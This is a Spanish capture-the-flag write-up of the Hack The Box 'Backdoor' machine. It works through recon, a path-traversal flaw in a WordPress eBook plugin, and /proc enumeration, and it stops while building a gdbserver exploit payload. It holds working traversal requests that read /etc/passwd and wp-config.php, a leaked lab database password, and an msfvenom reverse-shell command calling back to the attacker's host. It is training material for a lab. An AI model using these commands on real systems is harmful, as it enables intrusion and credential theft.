@@ -1,0 +1,293 @@
+<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Backdoor Writeup" /><meta name="author" content="xdann1" /><meta property="og:locale" content="es_ES" /><meta name="description" content="Máquina Easy, encontramos un plugin vulnerable a un LFI, lo juntamos con un Directory Traversal y conseguimos ver un proceso vulnerable a un RCE, por último, conseguimos aprovecharnos de un binario SUID para escalar privilegios." /><meta property="og:description" content="Máquina Easy, encontramos un plugin vulnerable a un LFI, lo juntamos con un Directory Traversal y conseguimos ver un proceso vulnerable a un RCE, por último, conseguimos aprovecharnos de un binario SUID para escalar privilegios." /><link rel="canonical" href="https://xdann1.github.io/posts/writeup-backdoor/" /><meta property="og:url" content="https://xdann1.github.io/posts/writeup-backdoor/" /><meta property="og:site_name" content="xDaNN1" /><meta property="og:image" content="https://xdann1.github.io/assets/img/commons/backdoor/backdoor.png" /><meta property="og:image:height" content="500" /><meta property="og:image:width" content="800" /><meta property="og:image:alt" content="Banner Backdoor" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-27T00:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://xdann1.github.io/assets/img/commons/backdoor/backdoor.png" /><meta name="twitter:image:alt" content="Banner Backdoor" /><meta property="twitter:title" content="Backdoor Writeup" /><meta name="twitter:site" content="@xdann1_" /><meta name="twitter:creator" content="@xDaNN1_" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"xdann1","url":"https://xdann1.github.io"},"dateModified":"2022-04-27T00:00:00+02:00","datePublished":"2022-04-27T00:00:00+02:00","description":"Máquina Easy, encontramos un plugin vulnerable a un LFI, lo juntamos con un Directory Traversal y conseguimos ver un proceso vulnerable a un RCE, por último, conseguimos aprovecharnos de un binario SUID para escalar privilegios.","headline":"Backdoor Writeup","image":{"width":800,"height":500,"alt":"Banner Backdoor","url":"https://xdann1.github.io/assets/img/commons/backdoor/backdoor.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://xdann1.github.io/posts/writeup-backdoor/"},"url":"https://xdann1.github.io/posts/writeup-backdoor/"}</script><title>Backdoor Writeup | xDaNN1</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="xDaNN1"><meta name="application-name" content="xDaNN1"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/commons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">xDaNN1</a></div><div class="site-subtitle font-italic">Cybersecurity enthusiast | CTF Player</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>SOBRE MÍ</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/xdann1" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/xdann1_" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://app.hackthebox.com/profile/535069" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/danielqueroperez/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Backdoor Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 500'%3E%3C/svg%3E" data-src="../../assets/img/commons/backdoor/backdoor.png" class="preview-img bg" alt="Banner Backdoor" width="800" height="500" data-proofer-ignore><h1 data-toc-skip>Backdoor Writeup</h1><div class="post-meta text-muted"><div> Por <em> <a href="https://xdann1.github.io">xdann1</a> </em></div><div class="d-flex"><div> <span> Publicado <em class="timeago" data-ts="1651010400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-27 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1870 palabras"> <em>10 min</em> de lectura</span></div></div></div><div class="post-content"><p>Máquina Easy, encontramos un plugin vulnerable a un LFI, lo juntamos con un Directory Traversal y conseguimos ver un proceso vulnerable a un RCE, por último, conseguimos aprovecharnos de un binario SUID para escalar privilegios.</p><h2 id="recopilación-de-información"><span class="mr-2">Recopilación de Información</span><a href="#recopilación-de-información" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Primero vamos a comprobar la conectividad con la máquina.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>❯ ping -c 1 10.10.11.125
+PING 10.10.11.125 (10.10.11.125) 56(84) bytes of data.
+64 bytes from 10.10.11.125: icmp_seq=1 ttl=63 time=40.1 ms
+
+--- 10.10.11.125 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 40.147/40.147/40.147/0.000 ms
+</pre></table></code></div></div><p>En la salida del comando anterior se puede ver un parametro llamado <code class="language-plaintext highlighter-rouge">ttl</code>, gracias a este parametro podemos saber que sistema operativo está corriendo en la máquina víctima.</p><ul><li>GNU/Linux = TTL 64<li>Windows = TTL 128</ul><p>En este caso, el sistema operativo que está corriendo en la máquina víctima es GNU/Linux.</p><p>Vamos a usar la herramienta <code class="language-plaintext highlighter-rouge">nmap</code> para descubrir que puertos estan abiertos y que servicios estan asociados a estos.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.125 -oG allPorts
+</pre></table></code></div></div><ul><li>-p- &gt; Escanea todos los puertos (65535)<li>–open &gt; Muestra solo los puertos con un estatus “open”<li>-sS &gt; Aplica un TCP SYN Scan<li>–min-rate 5000 &gt; Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo<li>-vvv &gt; Muestra la información en pantalla a medida que se descubre<li>-n &gt; Indica que no aplique resolución DNS<li>-Pn &gt; Indica que no aplique el protocolo ARP<li>10.10.10.11.125 &gt; Dirección IP que se quiere escanear<li>-oG allPorts &gt; Exporta el output a un fichero grepeable con nombre “allPorts”</ul><p>Este sería el output del comando</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-26 18:53 CEST
+Scanning 10.10.11.125 [65535 ports]
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+80/tcp   open  http    syn-ack ttl 63
+1337/tcp open  waste   syn-ack ttl 63
+</pre></table></code></div></div><p>Ahora vamos a realizar un escaneo más profundo, también con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>❯ nmap -p22,80,1337 -sC -sV 10.10.11.125 -oN targeted
+</pre></table></code></div></div><ul><li>-p22,80,1337 &gt; Indica los puertos que se quieren escanear, en este caso el 22, 80 y 1337<li>-sC &gt; Lanza scripts básicos de enumeración<li>-sV &gt; Enumera la versión y servicio que está corriendo en los puertos<li>10.10.10.125 &gt; Dirección IP que se quiere escanear<li>-oN targeted &gt; Exporta el output a un fichero en formato nmap con nombre “targeted”</ul><p>Este sería el output del comando:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-26 18:59 CEST
+Nmap scan report for 10.10.11.125
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
+|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
+|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Backdoor &amp;#8211; Real-Life
+|_http-generator: WordPress 5.8.1
+1337/tcp open  waste?
+</pre></table></code></div></div><p>Los puertos abiertos y sus servicios asocidados son:</p><ul><li>22/tcp &gt; ssh<li>80/tcp &gt; http<li>1337/tcp &gt; ?</ul><p>Al entrar a la web podemos ver que se esta usando un gestor de contenidos Wordpress, esto lo podemos ver gracias a un plugin del navegador llamado <code class="language-plaintext highlighter-rouge">Wappalyzer</code>, también podemos acceder a esta información desde la consola con la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>❯ whatweb http://10.10.11.125/
+http://10.10.11.125/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.125], JQuery[3.6.0], MetaGenerator[WordPress 5.8.1], PoweredBy[WordPress], Script, Title[Backdoor &amp;#8211; Real-Life], UncommonHeaders[link], WordPress[5.8.1]
+</pre></table></code></div></div><h1 id="busqueda-de-vulnerabilidades">Busqueda de vulnerabilidades</h1><p>El servidor está corriendo la versión 5.8.1 de Wordpress, tras investigar un poco se puede ver que esta versión de Wordpress no tiene ninguna vulnerabilidad interesante, sin embargo, puede haber algun plugin que si tenga alguna, lo que convertiria al gestor de contenidos en vulnerable.</p><p>Existen varias herramientas para enumerar gestores de contenido, en este caso utilizare <code class="language-plaintext highlighter-rouge">WPScan</code> (herramienta para enumerar Wordpress).</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>❯ wpscan --url http://10.10.11.125 -e vp
+[i] No plugins Found
+</pre></table></code></div></div><ul><li>-e &gt; Enumera<li>vp &gt; Vulnerable Plugins</ul><p>La herramienta no nos detecta ningún plugin, vamos a intentar enumerar el gestor de contenido de forma manual. El directorio en el que se alojan los plugins es <code class="language-plaintext highlighter-rouge">http://10.10.11.125/wp-content/plugins/</code>.</p><p><img data-src="/assets/img/commons/backdoor/plugin.png" alt="Plugin Wordpress" class="center-image" data-proofer-ignore> <em>Plugins Wordpress</em></p><p>Podemos observar que existe un plugin que no nos ha mostrado WPScan, vamos a ver si este plugin tiene alguna vulnerabilidad asociada.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>❯ searchsploit ebook wordpress
+---------------------------------------------------------------- ------------------------- 
+Exploit Title                                                   |  Path
+---------------------------------------------------------------- -------------------------
+WordPress Plugin eBook Download 1.1 - Directory Traversal       | php/webapps/39575.txt
+</pre></table></code></div></div><p>Podemos ver que el plugin eBook Download tiene asociada una vulnerabilidad que nos permite leer archivos del servidor (LFI) desde la siguiente ruta: <code class="language-plaintext highlighter-rouge">http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php</code></p><h1 id="explotación">Explotación</h1><p>Tenemos un LFI (Local File Inclusion), que juntado con un Directory Traversal nos permitirá ser capaces de leer archivos del servidor, vamos a intentar ver los usuarios existentes en la máquina víctima.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>❯ curl -s 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd' | grep "sh$"
+root:x:0:0:root:/root:/bin/bash
+user:x:1000:1000:user:/home/user:/bin/bash
+</pre></table></code></div></div><p>Ya tenemos un usuario con el que podriamos autenticarnos mediante ssh, ahora solamente necesitaremos algunas contraseñas. Podemos ver el archivo que utiliza Wordpress para la configuración de la comunicación con la base de datos.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>❯ curl -s 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php'
+</pre></table></code></div></div><p>Conseguimos credenciales de la base de datos</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'wordpressuser' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8' );
+
+/** The database collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+</pre></table></code></div></div><p>Desgraciadamente la máquina víctima no tiene MYSQL expuesto, podríamos intentar autenticarnos contra el servicio ssh o contra el panel de administrador de Wordpress pero no tendremos exito en ninguno de los casos anteriores.</p><p>Puesto que no podemos autenticarnos contra el sistema tendremos que seguir consiguiendo información mediante el LFI. Uno de los directorios m s importantes para conseguir información es el <code class="language-plaintext highlighter-rouge">/proc</code>, este directorio contiene un subdirectorio por cada proceso que se esté ejecutando. Nos puede ser útil a la hora de enumerar el kernel y los procesos.</p><p>Sabiendo esto, podemos conseguir ver que puertos estan abiertos internamente con el siguiente one-liner:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="k">for </span>port <span class="k">in</span> <span class="si">$(</span>curl <span class="nt">-s</span> <span class="s1">'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../proc/net/tcp'</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"local_address"</span> | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s2">":"</span> | <span class="nb">sort</span> <span class="nt">-u</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"[</span><span class="nv">$port</span><span class="s2">] -&gt; Puerto </span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"ibase=16; </span><span class="nv">$port</span><span class="s2">"</span> | bc<span class="si">)</span><span class="s2">"</span> <span class="p">;</span><span class="k">done</span>
+</pre></table></code></div></div><p>Podemos ver que la máquina víctima tiene los siguientes puertos abiertos internamente:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>[0016] -&gt; Puerto 22
+[0035] -&gt; Puerto 53
+[0539] -&gt; Puerto 1337
+[0CEA] -&gt; Puerto 3306
+[8124] -&gt; Puerto 33060
+[9B5A] -&gt; Puerto 39770
+[B2D0] -&gt; Puerto 45776
+</pre></table></code></div></div><p>Sigamos recopilando información, ahora intentaremos listar y obtener información sobre como se crearon todos los procesos que están en ejecución, para ello necesitaremos listar una serie de objetos de los procesos, puede ver más información sobre esto <a href="https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/#useful-proc-entries">aquí</a>. Usaremos el siguiente script para enumerar los servicios:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
+
+<span class="k">for </span>pid <span class="k">in</span> <span class="si">$(</span>curl <span class="nt">-s</span> <span class="s1">'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../proc/sched_debug'</span> <span class="nt">--output</span> - | <span class="nb">awk</span> <span class="s1">'{print $3}'</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\d</span><span class="s2">{1,6}"</span> | <span class="nb">sort</span> <span class="nt">-u</span><span class="si">)</span><span class="p">;</span> <span class="k">do 
+
+	</span><span class="nv">content</span><span class="o">=</span><span class="si">$(</span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"curl -s "</span>http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span class="o">=</span>../../../../../../../../../../../proc/<span class="nv">$pid</span>/cmdline<span class="s2">""</span> <span class="nt">--output</span> - | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s1">'cmdline'</span> <span class="s1">'{print $4}'</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s1">'&lt;script&gt;'</span> <span class="s1">'{print $1}'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span> &amp;<span class="si">)</span>
+
+	<span class="k">if</span> <span class="o">[[</span> <span class="nv">$content</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+		</span><span class="nb">echo</span> <span class="s2">"[*] PID </span><span class="nv">$pid</span><span class="s2">: "</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+		<span class="nb">echo</span> <span class="nv">$content</span>
+	<span class="k">fi
+
+done</span>
+</pre></table></code></div></div><p>La salida nos devuelve algunas cosas interesantes, los procesos con el PID (Process IDentifier) 791, 138936, 138937 y 138942 nos muestran que esta corriendo <code class="language-plaintext highlighter-rouge">gdbserver</code> en el puerto 1337. También nos muestra un proceso (PID 788) que utiliza el comando <code class="language-plaintext highlighter-rouge">screen</code>, esto nos puede llegar a servir en la escalada de privilegios.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>[*] PID 788: /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
+[*] PID 791: /bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
+[*] PID 811: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+[*] PID 1027: /usr/sbin/mysqld
+[*] PID 1032: /usr/sbin/mysqld
+[*] PID 136293: /bin/sh
+[*] PID 136404: /bin/bash
+[*] PID 138937: bash-ccd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
+[*] PID 139002: -/bin/bash
+</pre></table></code></div></div><p><strong>¿Qué es gdbserver?</strong></p><p>gdbserver es un programa informático que permite depurar otros programas de forma remota.</p><p>gdbserver cuenta con una vulnerabilidad para la versión 9.2 que nos permitira obtener un RCE (Remote Command Execution).</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>❯ searchsploit gdbserver
+---------------------------------------------------------------- ------------------------- 
+Exploit Title                                                   |  Path
+---------------------------------------------------------------- -------------------------
+GNU gdbserver 9.2 - Remote Command Execution (RCE)              | linux/remote/50539.py
+</pre></table></code></div></div><p>El exploit nos pedirá que generemos una reverse shell con la herramienta msfvenom.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>❯ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.242 LPORT=443 PrependFork=true -o rev.bin
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
